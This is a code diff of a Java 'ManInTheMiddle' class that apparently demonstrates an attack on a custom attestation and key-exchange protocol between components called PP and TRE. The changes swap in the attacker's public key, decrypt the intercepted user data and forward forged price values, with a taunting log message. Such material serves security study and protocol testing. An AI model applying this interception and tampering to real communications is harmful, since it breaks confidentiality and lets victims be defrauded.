@@ -101,7 +101,6 @@ public class ManInTheMiddle extends Pcap4j {
                 log.info("Package Aquired for TRE, value: {}", value);
                 try {
                     Message message = Utils.stringToMessage(value);
-
                     //get encrypte value from PP use it own private key to resolve it
                     if (message.getMessageType().equals(MessageType.GET_PRICE)) {
                         String user = decryptKey(String.valueOf(message.getObject()));
@@ -110,6 +109,7 @@ public class ManInTheMiddle extends Pcap4j {
                         sendEncryptedUserToTre(user);
                     } else if (message.getMessageType().equals(MessageType.ATTESTATION_REQUEST)){
                         ppPort = Integer.valueOf(srcPort);
+                        publicKeyFromTre = String.valueOf(message.getObject());
                         sendOwnPublicKeyToPp();
                     }
                 } catch (Exception e) {
@@ -149,8 +149,11 @@ public class ManInTheMiddle extends Pcap4j {
         Message message = new Message(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST, publicKey);
         try {
             log.info("Send own public key to PP {}", message);
-            middleManClientToPp.sendToPort(Utils.messageToString(message));
-        } catch (JsonProcessingException e) {
+            Message encryptedUser = middleManClientToPp.sendToPort(Utils.messageToString(message));
+
+            String user = decryptKey(String.valueOf(encryptedUser.getObject()));
+            sendWrongValueToPp(user);
+        } catch (Exception e) {
             log.error("Cannot send Message!! {}", e);
         }
     }
@@ -162,19 +165,18 @@ public class ManInTheMiddle extends Pcap4j {
             middleManClientToTre = new MiddleManClient(host, trePort);
         }
 
-        //wait until public key is comming
-        while (publicKeyFromTre == null) {
-            try {
-                Thread.sleep(1000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-        }
         String encryptedValue = Utils.encrypt(user, Base64.decodeBase64(publicKeyFromTre));
         Message message = new Message(MessageType.GET_PRICE, encryptedValue);
         try {
-            middleManClientToTre.sendToPort(Utils.messageToString(message));
+            Message response = middleManClientToTre.sendToPort(Utils.messageToString(message));
+            Map<String, Object> result = (Map<String, Object>) response.getObject();
+            QuoteAndRateResponseMessage quoteAndRateResponseMessage = new QuoteAndRateResponseMessage(String.valueOf(result.get("quote")), Integer.valueOf(String.valueOf(result.get("rateValue"))));
+            String receivedQuote = quoteAndRateResponseMessage.getQuote();
+
+            log.info("HAHA!! Get received Quote and value from TRE {}, replace with wrong value 888, make you in trouble!!!");;
+            sendWrongValueToPp(receivedQuote);
         } catch (JsonProcessingException e) {
+
             log.error("Cannot send Message!! {}", e);
         }
     }
